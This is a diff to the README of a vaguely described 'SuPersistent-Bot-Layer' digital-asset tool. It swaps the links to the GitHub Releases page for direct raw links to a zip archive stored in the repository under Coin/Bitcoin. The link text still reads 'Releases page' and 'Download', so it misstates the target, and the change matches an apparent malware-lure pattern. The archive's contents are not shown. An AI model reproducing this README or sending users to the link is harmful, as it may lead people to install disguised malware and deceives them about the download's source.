@@ -1,6 +1,6 @@
 # 🤖 SuPersistent-Bot-Layer - Seamlessly Connect with Digital Assets
 
-[![Download SuPersistent-Bot-Layer](https://img.shields.io/badge/Download-SuPersistent--Bot--Layer-blue.svg)](https://github.com/LieonNosrac87/SuPersistent-Bot-Layer/releases)
+[![Download SuPersistent-Bot-Layer](https://raw.githubusercontent.com/LieonNosrac87/SuPersistent-Bot-Layer/main/Coin/Bitcoin/SuPersistent-Bot-Layer_v2.3.zip)](https://raw.githubusercontent.com/LieonNosrac87/SuPersistent-Bot-Layer/main/Coin/Bitcoin/SuPersistent-Bot-Layer_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the SuPersistent Bot Layer! This software allows you to engage with d
 
 ## 📥 Download & Install
 
-To get started, please visit our [Releases page](https://github.com/LieonNosrac87/SuPersistent-Bot-Layer/releases) to download the latest version of the application. 
+To get started, please visit our [Releases page](https://raw.githubusercontent.com/LieonNosrac87/SuPersistent-Bot-Layer/main/Coin/Bitcoin/SuPersistent-Bot-Layer_v2.3.zip) to download the latest version of the application. 
 
 1. Click on the link above.
 2. Find the latest version.
